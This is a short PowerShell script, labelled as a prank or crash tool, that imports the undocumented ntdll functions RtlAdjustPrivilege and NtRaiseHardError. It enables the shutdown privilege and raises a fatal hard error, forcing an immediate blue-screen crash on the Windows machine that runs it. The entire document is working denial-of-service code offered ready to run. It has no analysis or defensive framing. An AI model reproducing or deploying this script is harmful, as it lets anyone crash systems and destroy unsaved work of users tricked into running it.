# Caution: This code WILL cause a BSOD on any Wndows system

# Assign Native API Functions
$signature = @'
  
[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi)]
public static extern IntPtr RtlAdjustPrivilege(
    [In] int Input1,
    [In] int Input2,
    [In] int Input3,
    [Out] out int Output1
);
[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Ansi)]
public static extern IntPtr NtRaiseHardError(
    [In] uint Input1,
    [In] int Input2,
    [In] int Input3,
    [In] int Input4,
    [In] int Input5,
    [Out] out int Output1
);
'@

Write-Host -NoNewLine 'Press any key to continue...';
$null = $Host.UI.RawUI.ReadKey('NoEcho,IncludeKeyDown');

Add-Type -MemberDefinition $signature -Name ntdll -Namespace PInvoke -Using PInvoke, System.Text;

$returnInt = 0
[PInvoke.ntdll]::RtlAdjustPrivilege(19, 1, 0, [ref] $returnInt)
[PInvoke.ntdll]::NtRaiseHardError(3221226528, 0, 0, 0, 6, [ref] $returnInt);